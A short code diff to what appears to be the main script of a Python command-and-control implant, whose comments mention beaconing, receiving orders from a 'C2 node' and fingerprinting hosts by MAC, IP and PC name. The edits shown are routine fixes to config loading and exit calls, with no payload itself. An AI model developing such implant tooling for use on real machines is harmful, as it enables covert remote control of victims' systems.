@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 import config
-from controller import Controller, NODE_IP_KEY, NODE_PORT_KEY
+from controller import Controller
 import time
 from random import randint
 import sys
@@ -16,7 +16,7 @@ from parser import *
 # - Prevent replays
 # - Add active day and active hour calculation to calculate_sleep()
 # - Get a GUID based off of MAC/IP/PC Name
-# - Move global values into an xml/plist type file for persistent changes from C2 node.
+# - Move global values into an xml/plist type file for PERSISTENT changes from C2 node.
 # - Create a tracking mechanism for threads started by commands from previous orders
 #
 # READ:
@@ -34,7 +34,7 @@ def load_config():
         if len(sys.argv) > 1:
             config_filename = sys.argv[1]
         else:
-            config_filename = config.DEFAULT_CONFIG_FILE
+            config_filename = sys.path[0] + os.path.sep + config.DEFAULT_CONFIG_FILE
         config_xml = get_xml(config_filename)
         
         # run the parsers. Nothing returns, they just set the values in config.py.
@@ -44,7 +44,7 @@ def load_config():
         
     except Exception, e:
         print '%s Fatal error parsing XML element - %s' % ( config.PROMPT, e)
-        exit()
+        sys.exit()
     
     # if no encoders were parsed, just invert the decoders. Effectively says "use the same encoding for responses as was used for the commands
     # received during the beaconing"
@@ -107,4 +107,4 @@ if __name__ == "__main__":
         main()
     except (KeyboardInterrupt, SystemExit):
         print config.PROMPT + " Exiting"
-        exit()
+        sys.exit()
